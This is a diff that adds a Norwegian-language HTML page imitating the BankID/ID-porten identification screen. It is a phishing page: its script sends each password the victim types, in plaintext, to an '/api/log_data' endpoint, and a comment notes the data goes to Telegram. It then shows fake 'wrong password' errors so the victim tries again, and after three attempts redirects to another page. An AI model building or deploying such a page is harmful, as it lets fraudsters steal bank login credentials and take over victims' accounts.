@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="nb">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BankID - Identifisering</title>
+    <style>
+        
+        body { 
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; 
+            background-color: #f0f2f5;
+            margin: 0; 
+            padding: 20px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: 95vh; 
+            color: #333;
+        }
+        .page-wrapper {
+            width: 100%;
+            max-width: 360px;
+        }
+        .id-porten-header { 
+            margin-bottom: 10px; 
+            font-size: 14px; 
+            color: #555; 
+            padding-left: 5px;
+        }
+        .bankid-container { 
+            background-color: #fff; 
+            border: 1px solid #d1d1d1; 
+            width: 100%; 
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05); 
+        }
+
+        /* Header */
+        .bankid-header { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 12px 15px;
+            border-bottom: 1px solid #e7e7e7; 
+        }
+        .bankid-header .logo-title { 
+            display: flex; 
+            align-items: center; 
+        }
+        .bankid-header .logo-title img { /* BankID logo */
+            height: 15px; 
+            margin-right: 8px; 
+        }
+        .bankid-header .logo-title h1 { 
+            font-size: 1.1rem; 
+            margin: 0; 
+            color: #333; 
+            font-weight: 600;
+        }
+        .bankid-header .menu-button { 
+            padding: 6px 10px; 
+            border: 1px solid #b0b0b0; 
+            background-color: #f0f0f0;
+            cursor: pointer; 
+            display: flex; 
+            align-items: center; 
+            font-size: 0.875rem; /* 14px */
+            border-radius: 3px;
+            color: #333;
+        }
+        .bankid-header .menu-button img { /* Menu icon */
+            height: 10px; 
+            margin-left: 6px;
+        }
+
+        /* Main Content / Form */
+        .bankid-main { 
+            padding: 20px 20px 20px 20px;
+        }
+        .form-wrapper { 
+            margin: 0 auto; 
+        }
+        .form-label-row { 
+            display: flex; 
+            align-items: center; 
+            margin-bottom: 6px; 
+            margin-top: 125px;
+        }
+        .form-label-row label { 
+            font-size: 1rem; /* 16px */
+            color: #222; 
+            font-weight: bold; 
+        }
+        .form-label-row .help-button { 
+            background: none; 
+            border: none; 
+            padding: 0; 
+            margin-left: 6px; 
+            cursor: pointer; 
+            line-height: 1;
+        }
+        .form-label-row .help-button img { 
+            width: 20px; 
+            height: 20px; 
+            vertical-align: middle; 
+        }
+
+        .input-row { 
+            display: flex; 
+            margin-bottom: 15px;
+            height: 42px;
+        }
+        .input-container { 
+            display: flex; 
+            border: 2px solid #0078BD;
+            border-radius: 3px; 
+            flex-grow: 1; 
+            background-color: #fff;
+        }
+        .input-container .icon-wrapper { 
+            padding: 0 10px;
+            display: flex; 
+            align-items: center; 
+            border-right: 1px solid #c1d9e9;
+        }
+        .input-container .icon-wrapper img { /* Key icon */
+            height: 14px;
+            width: auto;
+        }
+        .input-container input[type="password"] { 
+            flex-grow: 1; 
+            border: none; 
+            padding: 10px; 
+            font-size: 1rem; /* 16px */
+            border-radius: 0 2px 2px 0;
+            outline: none;
+        }
+        
+        .submit-button { 
+            background-color: #0078BD; 
+            border: none; 
+            color: white; 
+            padding: 0 12px;
+            border-radius: 3px; 
+            cursor: pointer; 
+            margin-left: 8px; 
+            display:flex; 
+            align-items:center; 
+            justify-content:center; 
+            width: 46px;
+            height: 100%;
+        }
+        .submit-button img { /* Arrow icon */
+            width: 22px;
+            height: auto; 
+        }
+        .submit-button:disabled { 
+            background-color: #b0bec5;
+            cursor: not-allowed;
+        }
+        input[type="password"]:disabled {
+            background-color: #e9ecef;
+            cursor: not-allowed;
+        }
+
+        .info-text { 
+            font-size: 0.875rem; /* 14px */
+            color: #555; 
+            margin-bottom: 3px; 
+        }
+        .link-button { 
+            background: none; 
+            border: none; 
+            color: #0078BD; 
+            text-decoration: underline; 
+            cursor: pointer; 
+            font-size: 0.875rem; /* 14px */
+            padding: 0; 
+            margin-bottom: 125px;
+        }
+
+        #error-message { 
+            color: #c00;
+            font-size: 0.875rem; /* 14px */
+            margin-top: 15px; 
+            text-align: left;
+            display: none; 
+            font-weight: normal;
+        }
+
+        /* Footer */
+        .bankid-footer { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 10px 15px;
+            border-top: 1px solid #e7e7e7; 
+            background-color: #f8f9fa;
+        }
+        .certificate-info { 
+            display: flex; 
+            align-items: center; 
+        }
+        .certificate-info .cert-icon { 
+            margin-right: 8px; 
+            display: flex;
+            align-items: center;
+        }
+        .certificate-info .cert-icon img { /* Shield icon */
+            height: 20px;
+            width: auto;
+        }
+        .certificate-info .cert-text div { 
+            font-size: 0.75rem; /* 12px */
+            color: #444; 
+            line-height: 1.3;
+        }
+        .certificate-info .cert-text .title { 
+            font-weight: bold; 
+        }
+        .history-button { 
+            background: none; 
+            border: none; 
+            cursor: pointer; 
+            padding: 5px;
+            display: flex;
+            align-items: center;
+        }
+        .history-button img { /* Clock icon */
+            height: 20px; 
+            width: auto;
+        }
+
+        .cancel-link-container { 
+            margin-top: 20px; 
+            text-align: center; 
+        }
+        .cancel-link-container a { 
+            color: #0078BD; 
+            text-decoration: none;
+            font-size: 0.875rem; /* 14px */
+        }
+         .cancel-link-container a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="page-wrapper">
+        <div class="id-porten-header">ID-porten</div>
+
+        <div class="bankid-container">
+            <header class="bankid-header">
+                <div class="logo-title">
+                    <img alt="BankID logo" src="images/bankid gjennomsiktig.svg">
+                                  <h1 tabindex="0">Identifisering</h1>
+                </div>
+                <button class="menu-button" title="Åpne meny" aria-label="Åpne meny">
+                    Meny
+                    <img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUiIGhlaWdodD0iMTAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19tZW51PC90aXRsZT48cGF0aCBkPSJNMCA4djJoMTV2LTJoLTE1em0wLTR2MmgxNXYtMmgtMTV6bTAtNHYyaDE1di0yaC0xNXoiIGZpbGw9IiM1NTUiLz48L3N2Zz4=">
+                </button>
+            </header>
+
+            <main class="bankid-main">
+                <form id="bankid-form" class="form-wrapper" autocomplete="off" novalidate>
+                    <div class="form-label-row">
+                        <label for="bankid-password">Ditt BankID-passord</label>
+                        <button type="button" class="help-button" title="Åpne hjelpedialogen" aria-label="Hjelp til BankID-passord">
+                            <img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19oZWxwPC90aXRsZT48ZyBmaWxsPSJub25lIj48cGF0aCBkPSJNMTcuNSA5YzAtNC42OTQtMy44MDYtOC41LTguNS04LjVzLTguNSAzLjgwNi04LjUgOC41IDMuODA2IDguNSA4LjUgOC41IDguNS0zLjgwNiA4LjUtOC41eiIgc3Ryb2tlPSIjMDA3OEJEIi8+PHBhdGggZD0iTTggMTJoMnYyaC0ydi0yem0uNzU4LThjMSAwIDEuODMxLjIzOSAyLjQ5My43MTcuNjYyLjQ3OC45OTIgMS4xODYuOTkyIDIuMTI0IDAgLjU3NS0uMTQ0IDEuMDYtLjQzMSAxLjQ1NC0uMTY4LjIzOS0uNDkxLjU0NC0uOTY5LjkxNmwtLjQ3MS4zNjVjLS4yNTcuMTk5LS4yNjguNDMxLS4zNTIuNjk3LS4wNTMuMTY4LS4wOTEuMzU3LS4wOTYuNzExaC0xLjkzM2MuMDI3LS43NDguMDg4LTEuMTkzLjIwMy0xLjQ3OC4xMTUtLjI4NS40MTItLjYxNC44OS0uOTg2bC40ODUtLjM3OGMuMTU5LS4xMTkuMjg4LS4yNS4zODUtLjM5Mi4xNzctLjI0My4yNjYtLjUxMS4yNjYtLjgwMyAwLS4zMzYtLjA5OC0uNjQzLS4yOTUtLjkxOS0uMTk3LS4yNzctLjU1Ny0uNDE1LTEuMDc5LS40MTUtLjUxMyAwLS44NzcuMTctMS4wOTIuNTExLS4yMTUuMzQxLS4yNTQuNDU2LS4yNTQuODIzaC0xLjkxOGMuMDUzLTEuMjYxLjQyNS0xLjkxNiAxLjI1My0yLjQ0My41MjItLjMzNiAxLjE2NC0uNTA1IDEuOTI1LS41MDV6IiBmaWxsPSIjMDA3OEJEIi8+PC9nPjwvc3ZnPg==">
+                        </button>
+                    </div>
+
+                    <div class="input-row">
+                        <div class="input-container">
+                            <div class="icon-wrapper">
+                                <img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjYiIGhlaWdodD0iMTMiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19wYXNzd29yZDwvdGl0bGU+PHBhdGggZD0iTTYuNSAxM2MtMy41OSAwLTYuNS0yLjkxLTYuNS02LjVzMi45MS02LjUgNi41LTYuNWMyLjcwNCAwIDUuMDIyIDEuNjUxIDYuMDAyIDRoMTEuNDk4bDIgMi0zIDIuOTk3LTMtMS45OTctMiAxLjk5Ny0xLS45OTdoLTQuMTc0Yy0uNjc3IDIuODY3LTMuMjUyIDUtNi4zMjYgNXptLS40NzQtNi41YzAtLjgyOC0uNjcyLTEuNS0xLjUtMS41cy0xLjUuNjcyLTEuNSAxLjUuNjcyIDEuNSAxLjUgMS41IDEuNS0uNjcyIDEuNS0xLjV6IiBmaWxsPSIjMDA3OEJEIi8+PC9zdmc+">
+                            </div>
+                            <input type="password" id="bankid-password" name="bankid_password" required minlength="1" autocapitalize="off" autocomplete="current-password">
+                        </div>
+                        <button type="submit" class="submit-button" title="Neste" aria-label="Neste">
+                            <img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMTkiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19hcnJvd19yaWdodDwvdGl0bGU+PHBhdGggZD0iTTE5IDExbC01IDUgMiAyIDgtOC41MzEtOC04LjQ2OS0yIDIgNSA1aC0xOXYzaDE5eiIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==">
+                        </button>
+                    </div>
+
+                    <div class="info-text">BankID</div>
+                    <button type="button" class="link-button">Glemt passord</button>
+
+                    <div id="error-message"></div>
+                </form>
+            </main>
+
+            <footer class="bankid-footer">
+                <div class="certificate-info">
+                    <div class="cert-icon">
+                        <img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUiIGhlaWdodD0iMTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19jZXJ0aWZpY2F0ZTwvdGl0bGU+PGcgZmlsbD0ibm9uZSI+PHBhdGggZD0iTTAgNi4yMDZjMCA0LjEzNyAzLjE5MiA5LjM0IDcuNSAxMS4zNzcgNC4yOTgtMi4wMzIgNy41LTcuMjQgNy41LTExLjM3N3YtNi4yMDZoLTE1djYuMjA2eiIgZmlsbD0iIzU1NSIvPjxwYXRoIGQ9Ik0xMC41IDMuNWwxIDEtNCA0LTEgMS0xLTEtMi0yIDEtMSAyIDIgNC00eiIgZmlsbD0iI2ZmZiIvPjwvZz48L3N2Zz4=">
+                    </div>
+                    <div class="cert-text">
+                        <div class="title">Personsertifikat</div>
+                        <div></div>
+                    </div>
+                </div>
+                <button class="history-button" title="Åpne BankID-historikk" aria-label="Åpne BankID-historikk">
+                    <img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19jbG9jazwvdGl0bGU+PHBhdGggZD0iTTE4IDljMC00Ljk3MS00LjAyOS05LTktOXMtOSA0LjAyOS05IDkgNC4wMjkgOSA5IDkgOS00LjAyOSA5LTl6bS04LTd2NmgzdjJoLTV2LThoMnoiIGZpbGw9IiM1NTUiLz48L3N2Zz4=">
+                </button>
+            </footer>
+        </div>
+
+        <div class="cancel-link-container">
+            <a href="#">Avbryt</a>
+        </div>
+    </div>
+
+    <script>
+let attempts = 0;
+const maxAttempts = 3;
+const form = document.getElementById('bankid-form');
+const passwordInput = document.getElementById('bankid-password');
+const submitButton = form.querySelector('button[type="submit"]');
+const errorMessageDiv = document.getElementById('error-message');
+
+form.addEventListener('submit', async function(event) {
+    event.preventDefault();
+    if (passwordInput.disabled) return;
+
+    const inputValue = passwordInput.value; // Henter den faktiske teksten
+
+    // Logg dataen til Telegram
+    let dataSent = false;
+    try {
+        const response = await fetch("/api/log_data", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                page: 'page4.html',
+                fodselsnummer: null,
+                event_description: `Passord ble sendt.`,
+                klartekst_input: inputValue
+            })
+        });
+
+        if (!response.ok) {
+            const errorData = await response.json().catch(() => ({ message: 'Ukjent feil' }));
+            throw new Error(`Serverfeil: ${response.status} - ${errorData.message}`);
+        }
+
+        const result = await response.json();
+        console.log("Data sendt til /api/log_data:", result.message);
+        dataSent = true;
+    } catch (error) {
+        console.error('Kunne ikke logge data:', error);
+        alert('Det oppstod en feil ved innsending av data. Vennligst prøv igjen.');
+        return; // Ikke fortsett hvis data ikke ble sendt
+    }
+
+    // Fortsett kun hvis data ble sendt
+    if (!dataSent) {
+        return;
+    }
+
+    // --- Resten av koden er for UI og forblir den samme ---
+    if (inputValue.trim() === '') {
+        errorMessageDiv.textContent = "Passordfeltet kan ikke være tomt.";
+        errorMessageDiv.style.display = 'block';
+        passwordInput.focus();
+        return;
+    }
+    attempts++;
+    if (attempts >= maxAttempts) {
+        errorMessageDiv.textContent = "Du har prøvd for mange ganger. Prøv igjen senere.";
+        errorMessageDiv.style.display = 'block';
+        passwordInput.disabled = true;
+        submitButton.disabled = true;
+
+         // Omdiriger til page 5 etter 3 sekunder
+                setTimeout(() => {
+                    window.location.href = 'page3.html';
+                }, 3000); // 3000 millisekunder = 3 sekunder    
+
+
+    } else {
+        passwordInput.value = '';
+        passwordInput.focus();
+        let attemptsRemaining = maxAttempts - attempts;
+        errorMessageDiv.textContent = `Feil passord. Du har ${attemptsRemaining} forsøk igjen.`;
+        errorMessageDiv.style.display = 'block';
+    }
+});
+    </script>
+
+</body>
+</html>
